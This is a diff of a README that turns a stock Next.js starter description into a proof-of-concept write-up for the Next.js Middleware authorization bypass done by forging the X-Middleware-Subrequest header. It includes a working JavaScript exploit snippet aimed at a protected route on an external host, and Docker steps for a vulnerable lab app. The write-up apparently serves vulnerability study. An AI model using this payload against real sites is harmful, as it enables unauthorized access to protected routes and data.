@@ -1,36 +1,84 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# Next.js Middleware Authorization Bypass PoC
 
-## Getting Started
+This project demonstrates an **Authorization Bypass vulnerability in Next.js Middleware**, as described in [ProjectDiscovery Blog](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass).
 
-First, run the development server:
+## 📝 Vulnerability Summary
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
+Next.js Middleware is a powerful feature to process requests at the edge before reaching the application logic. However, if the `X-Middleware-Subrequest` header is not properly validated, it can lead to **authentication and authorization bypass**.
+
+### Root Cause:
+
+- Middleware relies on the `X-Middleware-Subrequest` header to determine internal subrequests.
+- An attacker can forge this header to trick the Middleware into skipping critical checks (such as authentication).
+
+### Impact:
+
+- Unauthorized access to protected routes and sensitive data.
+- Bypassing authentication mechanisms implemented via Middleware.
+
+## 🚀 Proof of Concept (PoC)
+
+The following JavaScript snippet demonstrates how an attacker can bypass the Middleware protections:
+
+```javascript
+(function () {
+  var iframe = document.createElement("iframe");
+  iframe.style.display = "none";
+  iframe.src = "https://zerotix.liara.run/protected-route";
+  document.body.appendChild(iframe);
+  iframe.onload = function () {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://zerotix.liara.run/protected-route", true);
+    xhr.setRequestHeader("X-Middleware-Subrequest", "middleware:middleware:middleware:middleware:middleware");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) {
+        if (xhr.status === 200) {
+          console.log("%c[+] Middleware Bypassed! Response Loaded Below:", "color: green;");
+          console.log(xhr.responseText);
+          var newWin = window.open();
+          newWin.document.write(xhr.responseText);
+        } else {
+          console.error("[-] Bypass Failed. Status:", xhr.status);
+        }
+      }
+    };
+    xhr.send();
+  };
+})();
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+### Explanation:
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+- Loads the protected route in a hidden iframe to establish a valid origin context.
+- Sends an XMLHttpRequest with a crafted `X-Middleware-Subrequest` header.
+- If the bypass is successful, it logs and displays the response content.
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+## 🐳 Running the Vulnerable App (Docker)
 
-## Learn More
+Follow these steps to run the vulnerable Next.js application:
 
-To learn more about Next.js, take a look at the following resources:
+### 1. Build the Docker image:
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+```bash
+docker build -t nextjs-middleware-bypass .
+```
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+### 2. Run the Docker container:
 
-## Deploy on Vercel
+```bash
+docker run -p 3000:3000 nextjs-middleware-bypass
+```
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+### 3. Access the application at:
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+```
+http://localhost:3000
+```
+
+## 🔗 References
+
+- [ProjectDiscovery Blog — Next.js Middleware Authorization Bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
+
+## ⚠️ Disclaimer
+
+This project is intended for **educational purposes only**. Unauthorized exploitation of systems is illegal. Always ensure you have proper authorization before performing security testing.
